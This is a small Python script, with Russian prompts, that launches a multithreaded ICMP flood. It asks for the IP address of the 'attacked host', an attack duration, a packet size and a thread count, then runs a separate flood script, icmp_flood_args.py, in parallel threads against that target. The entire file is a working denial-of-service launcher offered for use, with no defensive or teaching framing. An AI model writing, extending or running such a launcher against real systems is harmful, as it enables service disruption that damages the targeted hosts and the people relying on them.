import subprocess
import threading

def send_ping(ip_dest,duration,packet_size):
    subprocess.run(f'python icmp_flood_args.py -target {ip_dest} -duration {duration} -size {packet_size}', stdout=subprocess.DEVNULL)

def main():
    ip_destination = str(input('IP - адрес атакуемого хоста: '))
    duration = int(input('Продолжительность атаки (с): '))
    sent_buff_size = int(input('Размер пакета (байт): '))
    num_threads = int(input('Количество потоков: '))

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_ping, args=(ip_destination,duration,sent_buff_size))
        threads.append(thread)
        thread.start()
    print('\nRunning')
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()